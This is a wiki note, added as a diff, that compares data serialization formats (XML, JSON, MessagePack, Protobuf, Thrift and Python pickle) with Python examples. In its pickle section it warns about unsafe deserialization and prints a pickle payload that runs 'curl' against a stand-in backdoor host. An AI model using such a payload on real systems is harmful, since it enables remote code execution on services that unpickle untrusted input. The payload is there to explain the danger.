@@ -1,0 +1,256 @@
+created: 20180604081556993
+modified: 20180604112856705
+title: data-serialization
+type: text/vnd.tiddlywiki
+
+!! Context
+
+Processes need to interact with each other and hence they need to speak in same language. The serialization is the process of translating data structures and code objects into data stream in a format that can be stored or transmitted and deserialize back to origin data structure and code objects.
+
+!! Uses
+
+* Store data from memory into databases or disk.
+* Transmit data to other processes or services.
+* Remove procedure calls.
+
+!! Solutions
+
+A list of serialization technology can be found in [[Wikipedia - Comparison of data serialization formats|https://en.wikipedia.org/wiki/Comparison_of_data_serialization_formats]]. Below covers the most widely used serialization format in industry.
+
+!!! XML
+
+XML stands for eXtensible Markup Language. It's designed to store and transport data and human readable. Below is an example serialized data:
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<book>
+  <isbn>9780262510875</isbn>
+  <title>Structure and Interpretation of Computer Programs - 2nd Edition</title>
+</book>
+```
+
+Serialize (in Python 3):
+
+```
+>>> root = ET.Element('book')
+>>> isbn = ET.SubElement(root, 'isbn')
+>>> isbn.text = '9780262510875'
+>>> title = ET.SubElement(root, 'title')
+>>> title.text = 'Structure and Interpretation of Computer Programs - 2nd Edition'
+>>> ET.dump(root)
+<book><isbn>9780262510875</isbn><title>Structure and Interpretation of Computer Programs - 2nd Edition</title></book>
+```
+
+Deserialize (in Python 3):
+
+```
+>>> import xml.etree.ElementTree as ET
+
+>>> root = ET.fromstring('<?xml version="1.0" encoding="UTF-8"?><book><isbn>9780262510875</isbn><title>Structure and Interpretation of Computer Programs - 2nd Edition</title></book>')
+
+>>> book = {child.tag: child.text for child in root}
+
+>>> book
+{'isbn': '9780262510875', 'title': 'Structure and Interpretation of Computer Programs - 2nd Edition'}
+```
+
+* Advantages:
+** Most languages support XML well.
+** Good performance for large data set.
+** Well adopted in SOAP methodology.
+** Support attributes in a data structure.
+* Disadvantages:
+** Serialized content is tedious and long. For example, it requires closing tags like `</isbn>`.
+** Usually needs to write extra code to turn XML to code objects.
+
+!!! JSON
+
+JSON (JavaScript Object Notation) is a lightweight data-interchange format. It's originally a subset of Language JavaScript, however, it's the de facto serialization protocol when providing RESTful API services. Below is an example:
+
+```
+{
+  "name": "EnqueueZero",
+  "description": "Enqueue Zero is creating code principles",
+  "homepage": "https://github.com/soasme/EnqueueZero",
+  "private": false,
+  "has_issues": true,
+  "has_projects": false,
+  "has_wiki": false
+}
+```
+
+Serialize and deserialize (in Python 3):
+
+```
+>>> import json
+
+>>> json.dumps({'isbn': '9780262510875', 'title': 'Structure and Interpretation of Computer Programs - 2nd Edition'})
+'{"isbn": "9780262510875", "title": "Structure and Interpretation of Computer Programs - 2nd Edition"}'
+
+>>> json.loads('{"isbn": "9780262510875", "title": "Structure and Interpretation of Computer Programs - 2nd Edition"}')
+{'isbn': '9780262510875', 'title': 'Structure and Interpretation of Computer Programs - 2nd Edition'}
+```
+
+* Advantages:
+** Simple and straightforward specification.
+** Widespread Support. Almost all programming languages support serializing and deserializing JSON in their standard libraries.
+** Human readable.
+* Disadvantages:
+** Limited data types: null, boolean, string, integer, float, object, array. When serializing some non-supported data types, we converted them into string instead, for example, `datetime(1989, 6, 4, 0, 0, 0)` can be translated into ISO8601 format first `1989-06-04T00:00:00+0800`.
+** Performance is not good when dataset is huge. Program usually needs to load all data into memory first.
+
+!!! MsgPack
+
+MessagePack is an efficient binary serialization format. It lets you exchange data among multiple languages like JSON. 
+
+Significant difference between JSON:
+
+* Binary format instead of String.
+* Small integers are encoded into a single byte
+* Short strings are encoded with one extra byte  in addition to the strings themselves.
+
+MessagePack usually doesn't have language built-in library support, therefore you generally need to install a library to serialize and deserialize data. For example, in Python, you can install via `pip`:
+
+```
+$ pip install msgpack-python
+```
+
+Serialize and deserialize (in Python 3):
+
+```
+>>> import msgpack
+>>> msgpack.packb([1, 2, 3], use_bin_type=True)
+'\x93\x01\x02\x03'
+>>> msgpack.unpackb(_, raw=False)
+[1, 2, 3]
+```
+
+* Advantages:
+** Very efficient.
+** Good performance.
+** Support streaming API.
+* Disadvantages:
+** No built-in support in most languages.
+
+!!! Protobuf
+
+Protocol Buffers, known as protobuf, is Google's data interchange format originally and has widely used in many other corporations.
+
+Usage:
+
+* Define schemas for data structures in `.proto` file.
+* Use the protocol buffer compiler translate proto into a library.
+* Use the given API provided by the generated library to write and read messages.
+
+Below is an example `book.proto` file:
+
+```
+message Book {
+  required string isbn = 1;
+  optional string title = 2;
+}
+```
+
+Generating library is through `protoc` command.
+
+```
+$ protoc -I=$SRC_DIR --python_out=$DST_DIR $SRC_DIR/book.proto
+```
+
+This generates `book_pb2.py` in `DST_DIR`, which is like below. You should never modify below generated file but to modify proto file first and re-generate:
+
+```
+class Book(message.Message):
+    __metaclass__ = reflection.GeneratedProtocolMessageType
+...
+```
+
+Serialize:
+
+```
+>>> import book_pb2
+>>> book = book_pb2.Book()
+>>> book.id = '9780262510875'
+>>> book.title = 'Structure and Interpretation of Computer Programs - 2nd Edition'
+>>> book.SerializeToString()
+```
+
+* Advantages:
+** Very efficient.
+** Good performance.
+** Has tested at scale in industry-level environments.
+* Disadvantages:
+** Complicated. Need define `proto` and generate library first.
+** It requires the program doing data parsing work to have the generated library as well. This would generally cause problem when schema modified.
+
+!!! Thrift
+
+Thrift is similar to ProtoBuf in all likelihood. It shares exact the same processes and concepts like ProtoBuf.
+
+!!! Language Built-in Serialization
+
+Most languages have their own serialization solutions. There is rare example that data serialized by different languages can be used in other languages. This is mainly because data objects are represented very different in memory.
+
+For example, in Python, you can use pickle and cPickle:
+
+```
+>>> class Foo:
+...     attr = 'A class attribute'
+...
+
+>>> import pickle
+>>> picklestring = pickle.dumps(Foo)
+
+>>> picklestring
+b'\x80\x03c__main__\nFoo\nq\x00.'
+
+>>> pickle.loads(picklestring)
+<class '__main__.Foo'>
+```
+
+Similar classes or interfaces can be found in other languages, for example, Marshal for Ruby, function serialize for PHP, class implemented `java.io.Serializable` for Java, etc.
+
+The deserialization is usually dangerous when in language specific format. Deserialization usually means code execution, and therefore, malformed data from untrusted source can harm the system that runs the program.  It's the worst choice and generally not recommend to use. Below is an example that a pickled data can send server ip to a backdoor service.
+
+```
+data  = """cos
+system
+(S'curl https://example.com/backdoor'
+tR.
+"""
+pickle.loads(data)
+```
+
+* Advantage
+** Can support various data types.
+* Disadvantage
+** DANGEROUS!
+** Can't be used in other languages.
+
+!! Conclusion
+
+* JSON is usually your first choice. It's simple, human readable, and has most widespread support.
+* Use MsgPack instead of JSON if performance is an issue.
+* Use Protobuf if type check and schema check is essential.
+* Use Thrift if you're developing RPC services.
+* Use language built-in serialization functions or methods if the use case is only limited in a single language, and you don't care security that much (not good). 
+
+!! References
+
+* [[Avro|http://avro.apache.org/docs/current/]]
+* [[Comparison of data serialization formats|https://en.wikipedia.org/wiki/Comparison_of_data_serialization_formats]]
+* [[Don't pickle your data|https://www.benfrederickson.com/dont-pickle-your-data/]]
+* [[How do I read and write with msgpack|https://stackoverflow.com/questions/43442194/how-do-i-read-and-write-with-msgpack/43442195]]
+* [[Java serialization|https://www.tutorialspoint.com/java/java_serialization.htm]]
+* [[Msgpack official website|https://msgpack.org/index.html]]
+* [[PHP Manual - serialize|https://php.net/serialize]]
+* [[Protocol Buffers|https://developers.google.com/protocol-buffers/]]
+* [[Protocol Buffers, Avro, Thrift & MessagePack|https://www.igvita.com/2011/08/01/protocol-buffers-avro-thrift-messagepack/]]
+* [[Python Manual - json|https://docs.python.org/2/library/json.html]]
+* [[Python Serialization|http://jmoiron.net/blog/python-serialization/]]
+* [[Ruby Manual - Markshal|http://ruby-doc.org/core-2.0.0/Marshal.html]]
+* [[What does Serializable mean|https://stackoverflow.com/questions/3429921/what-does-serializable-mean]]
+* [[What is code serialization|https://stackoverflow.com/questions/447898/what-is-object-serialization]]
+* [[Wikipedia - Serialization|https://en.wikipedia.org/wiki/Serialization]]
+* [[XML|https://www.w3schools.com/xmL/default.asp]]
+* [[You're Using JSON, Why not MessagePack|https://news.ycombinator.com/item?id=2571729]]
